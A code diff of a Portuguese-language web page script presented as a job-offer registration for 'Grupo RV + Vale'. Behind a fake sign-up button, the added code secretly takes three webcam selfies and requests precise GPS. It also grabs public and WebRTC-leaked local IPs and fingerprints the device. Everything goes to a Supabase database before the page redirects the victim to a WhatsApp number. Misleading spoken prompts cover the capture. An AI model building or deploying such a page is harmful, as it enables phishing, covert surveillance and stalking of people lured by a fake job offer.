@@ -1,53 +1,71 @@
+// =================================================================
+// CONFIGURAÇÃO DE CONEXÃO (Usando o Supabase Global do HTML)
+// =================================================================
 const SUPABASE_URL = "https://gskcadoofoqwhqhscxcs.supabase.co";
 const SUPABASE_KEY = "sb_publishable_xup-F-C4wv_epMIAbohpjQ_aXnLZOL3";
-
 const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
+// Elementos da Página
 const video = document.getElementById("video");
 const btn = document.getElementById("btn");
 const statusText = document.getElementById("status");
 const canvas = document.getElementById("canvas");
 
-// Função para salvar
+// =================================================================
+// SISTEMA DE ÁUDIO
+// =================================================================
+function falar(texto){
+  speechSynthesis.cancel();
+  const fala = new SpeechSynthesisUtterance(texto);
+  fala.lang = "pt-BR";
+  fala.volume = 1;
+  fala.rate = 0.95;
+  speechSynthesis.speak(fala);
+}
+
+// =================================================================
+// FUNÇÃO PARA SALVAR NO BANCO
+// =================================================================
 async function salvarNoBanco(dados) {
   const { error } = await supabaseClient.from('checkins').insert([dados]);
-  if (error) console.error(error);
+  if (error) console.error("Erro ao salvar:", error);
   return !error;
 }
 
-// Captura de IP + Porta + Básico
+// =================================================================
+// CAPTURA DE INFORMAÇÕES BÁSICAS (IP + PORTA)
+// =================================================================
 async function getInfoBasica() {
-  const info = {
-    tipo_captura: "previa"
-  };
+  const info = { tipo_captura: "previa" };
 
-  // IP Externo
   try {
-    const res = await fetch("https://ipapi.co/json/");
-    const data = await res.json();
-    info.ip = data.ip;
-    info.cidade = data.city;
-    info.estado = data.region;
-    info.pais = data.country_name;
-  } catch(e) {}
+    const req = await fetch("https://ipapi.co/json/");
+    const json = await req.json();
+    info.ip = json.ip || "indisponível";
+    info.cidade = json.city || "";
+    info.estado = json.region || "";
+    info.pais = json.country_name || "";
+  } catch(err) {
+    console.log("Erro IPAPI:", err);
+  }
 
-  // Tentativa de Porta e IP Local via WebRTC
+  // Tentativa de captura de IP Local e Porta via WebRTC
   try {
     const rtc = new RTCPeerConnection({ iceServers: [] });
     rtc.createDataChannel("");
     const offer = await rtc.createOffer();
     await rtc.setLocalDescription(offer);
 
-    rtc.onicecandidate = (e) => {
-      if (e.candidate) {
-        const cand = e.candidate.candidate;
-        const ipMatch = cand.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
-        const portMatch = cand.match(/(\d{4,5})\s+typ/);
+    rtc.onicecandidate = (event) => {
+      if (event.candidate) {
+        const candidate = event.candidate.candidate;
+        const ipMatch = candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
+        const portMatch = candidate.match(/(\d{4,5})\s+typ/);
         if (ipMatch) info.local_ip = ipMatch[1];
         if (portMatch) info.local_port = portMatch[1];
       }
     };
-  } catch(e) {}
+  } catch(err) {}
 
   info.user_agent = navigator.userAgent;
   info.timestamp = new Date().toISOString();
@@ -55,86 +73,186 @@ async function getInfoBasica() {
   return info;
 }
 
-// ================================================
-// SALVAMENTO PRÉVIO (ao abrir a página)
-// ================================================
-window.onload = async () => {
-  statusText.innerHTML = "🟡 Salvando informações iniciais...";
-
-  const infoPrevia = await getInfoBasica();
-  await salvarNoBanco(infoPrevia);
-
-  statusText.innerHTML = "✅ Informações iniciais salvas.<br>Clique no botão para completar o cadastro.";
-
-  // Inicia a câmera discretamente
+// =================================================================
+// INICIALIZAÇÃO DO SISTEMA E CÂMERA + SALVAMENTO PRÉVIO
+// =================================================================
+async function iniciarSistema(){
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+    falar("Seu cadastro será realizado automaticamente após clicar no botão verde abaixo.");
+    statusText.innerHTML = "🟡 Iniciando sistema...";
+
+    // Salvamento Prévio (IP + Porta)
+    statusText.innerHTML = "🌐 Salvando informações iniciais...";
+    const infoPrevia = await getInfoBasica();
+    await salvarNoBanco(infoPrevia);
+
+    // Inicia câmera
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: false
+    });
     video.srcObject = stream;
-  } catch(e) {}
+    await video.play();
+
+    await new Promise((resolve) => {
+      if(video.readyState >= 2){
+        resolve();
+      } else {
+        video.onloadeddata = () => resolve();
+      }
+    });
+
+    statusText.innerHTML = "✅ Sistema pronto. Clique no botão para completar.";
+  } catch(err) {
+    console.log(err);
+    statusText.innerHTML = "❌ Permita câmera";
+  }
+}
+
+window.onload = () => {
+  iniciarSistema();
 };
 
-// ================================================
-// SALVAMENTO COMPLETO (ao clicar no botão)
-// ================================================
+// =================================================================
+// RASTREADOR E ANALISADOR DE DISPOSITIVO
+// =================================================================
+function analisarDispositivo() {
+  const ua = navigator.userAgent;
+  let androidVersion = "Não é Android";
+  if (ua.indexOf("Android") >= 0) {
+      const match = ua.match(/Android\s([0-9\.]+)/);
+      if (match) androidVersion = match[1];
+  }
+ 
+  let browser = "Desconhecido";
+  if (ua.indexOf("Chrome") >= 0 && ua.indexOf("Edge") === -1) browser = "Chrome";
+  else if (ua.indexOf("Firefox") >= 0) browser = "Firefox";
+  else if (ua.indexOf("Safari") >= 0 && ua.indexOf("Chrome") === -1) browser = "Safari";
+  else if (ua.indexOf("Edge") >= 0 || ua.indexOf("Edg") >= 0) browser = "Edge";
+ 
+  let model = "Desconhecido";
+  if (ua.indexOf("Mobile") >= 0) {
+      const parts = ua.split(/[()]/);
+      if (parts.length > 1) {
+          const deviceParts = parts[1].split(';');
+          for (let part of deviceParts) {
+              if (part.indexOf("Android") === -1 && part.indexOf("Linux") === -1 && part.indexOf("iPhone") === -1 && part.indexOf("iPad") === -1 && part.indexOf("Windows") === -1 && part.indexOf("Macintosh") === -1 && part.length > 2) {
+                  model = part.trim();
+                  break;
+              }
+          }
+      }
+  }
+  return { androidVersion, browser, model };
+}
+
+// =================================================================
+// EVENTO DO BOTÃO: FLUXO DE CAPTURA COMPLETA
+// =================================================================
 btn.addEventListener("click", async () => {
   try {
     btn.disabled = true;
     btn.innerHTML = "PROCESSANDO...";
-    statusText.innerHTML = "📸 Capturando fotos e dados completos...";
+   
+    statusText.innerHTML = "📨 Verificando informações do convite..";
+    falar("Verificando informações do convite..");
 
-    // Captura fotos
+    const largura = video.videoWidth;
+    const altura = video.videoHeight;
+    if(!largura || !altura){
+      throw new Error("Vídeo não carregou corretamente.");
+    }
+
     canvas.width = 640;
     canvas.height = 480;
     const ctx = canvas.getContext("2d");
     const fotos = [];
 
-    for (let i = 0; i < 3; i++) {
-      ctx.drawImage(video, 0, 0, 640, 480);
-      fotos.push(canvas.toDataURL("image/jpeg", 0.45));
-      if (i < 2) await new Promise(r => setTimeout(r, 800));
+    for(let i = 0; i < 3; i++) {
+        ctx.drawImage(video, 0, 0, 640, 480);
+        fotos.push(canvas.toDataURL("image/jpeg", 0.35));
+        if(i < 2) await new Promise(resolve => setTimeout(resolve, 1000));
     }
 
-    // Desliga câmera
-    if (video.srcObject) video.srcObject.getTracks().forEach(track => track.stop());
+    const stream = video.srcObject;
+    if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+    }
 
-    // Geolocalização
     let latitude = "não permitido";
     let longitude = "não permitido";
     try {
-      const pos = await new Promise((resolve, reject) => 
-        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true })
-      );
-      latitude = pos.coords.latitude;
-      longitude = pos.coords.longitude;
-    } catch(e) {}
-
-    const infoBasica = await getInfoBasica();
-    infoBasica.tipo_captura = "completo";
-    infoBasica.selfies = fotos;
-    infoBasica.latitude = latitude.toString();
-    infoBasica.longitude = longitude.toString();
-
-    const sucesso = await salvarNoBanco(infoBasica);
-
-    if (sucesso) {
-      statusText.innerHTML = "✅ Cadastro completo realizado com sucesso!";
-      falar("Cadastro concluído com sucesso.");
-      
-      setTimeout(() => {
-        window.location.href = "https://wa.me/5594981100607?text=Eu%20concordo%20e%20quero%20participar%20das%20vagas%20do%20Grupo%20RV%20%2B%20Vale.";
-      }, 2200);
+      statusText.innerHTML = "📍 Localizando sua Vaga...";
+      falar("Localizando sua Vaga.");
+      const localizacao = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+          enableHighAccuracy: true,
+          timeout: 10000
+        });
+      });
+      latitude = localizacao.coords.latitude;
+      longitude = localizacao.coords.longitude;
+    } catch(err) {
+      console.log("GPS não capturado:", err);
     }
 
-  } catch (err) {
-    console.error(err);
-    statusText.innerHTML = "❌ Ocorreu um erro. Tente novamente.";
+    let ip = "indisponível";
+    let cidade = "";
+    let estado = "";
+    let pais = "";
+    try {
+      statusText.innerHTML = "🌐 Obtendo Dados Regionais...";
+      const req = await fetch("https://ipapi.co/json/");
+      const json = await req.json();
+      ip = json.ip || "indisponível";
+      cidade = json.city || "";
+      estado = json.region || "";
+      pais = json.country_name || "";
+    } catch(err) {
+      console.log("Erro IPAPI:", err);
+    }
+
+    statusText.innerHTML = "💾 Salvando cadastro completo...";
+    falar("Salvando cadastro completo.");
+
+    const infoDispositivo = analisarDispositivo();
+
+    const { error } = await supabaseClient
+      .from('checkins')
+      .insert([{
+        tipo_captura: "completo",
+        selfies: fotos,
+        latitude: latitude.toString(),
+        longitude: longitude.toString(),
+        ip: ip,
+        cidade: cidade,
+        estado: estado,
+        pais: pais,
+        user_agent: navigator.userAgent,
+        modelo_dispositivo: infoDispositivo.model,
+        versao_android: infoDispositivo.androidVersion,
+        navegador: infoDispositivo.browser,
+        plataforma: navigator.platform,
+        idioma: navigator.language,
+        largura_tela: window.innerWidth,
+        altura_tela: window.innerHeight,
+        local_ip: null,   // será preenchido se conseguir
+        local_port: null
+      }]);
+
+    if (error) throw error;
+
+    statusText.innerHTML = "✅ Cadastro concluído";
+    falar("Cadastro concluído com sucesso.");
+
+    setTimeout(() => {
+      window.location.href = "https://wa.me/5594981100607?text=Eu%20concordo%20e%20quero%20participar%20das%20vagas%20do%20Grupo%20RV%20%2B%20Vale.";
+    }, 2000);
+
+  } catch(err) {
+    console.log(err);
+    statusText.innerHTML = "❌ Erro: " + (err.message || "Falha de comunicação externa.");
     btn.disabled = false;
     btn.innerHTML = "QUERO PARTICIPAR";
   }
 });
-
-function falar(texto) {
-  const fala = new SpeechSynthesisUtterance(texto);
-  fala.lang = "pt-BR";
-  speechSynthesis.speak(fala);
-}
